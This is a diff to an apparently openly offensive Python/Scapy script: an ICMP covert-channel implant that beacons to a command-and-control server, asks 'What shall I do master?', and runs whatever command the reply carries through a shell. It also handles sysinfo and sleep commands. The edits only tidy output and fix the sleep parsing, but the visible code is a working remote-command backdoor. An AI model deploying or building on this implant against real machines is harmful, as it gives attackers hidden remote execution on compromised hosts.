@@ -21,17 +21,17 @@ def main(argv):
 			print "----------------------------"
 			exit()
 		packet=IP(dst=sys.argv[1])/ICMP()/"What shall I do master?"
-		packet.show()
+		#packet.show()
 		p=sr1(packet)
 		print "[*] String sent to C2 server: What shall I do master?" 
 		if p:
-			p.show()
+			#p.show()
 			try:
 				response=p['Raw'].load
 				# Check ICMP data for 'run' command
 				print "[*] String received from C2 server: " + p['Raw'].load
 				if 'run' in response:
-					print "[*] Running command: " + response[4:]
+					print "[*] Master says run command: " + response[4:]
 					command = response[4:]
 					command.split()
 					proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
@@ -42,10 +42,12 @@ def main(argv):
 					print "[*] Master requesting sysinfo"
 				elif 'sleep' in response:
 					seconds = response[6:]
-					print "[*] Master says sleep for (%s) seconds", seconds
-					time.sleep(seconds)
+					print "[*] Master says sleep for %s seconds" % (seconds)
+					print "[*] Sleeping..."
+					time.sleep(int(seconds))
 			except:
 				print "[X] ERROR: ", sys.exc_info()[0] 
+		print "[*] Sleeping now..."
 		time.sleep(300)
 
 if __name__ == "__main__":
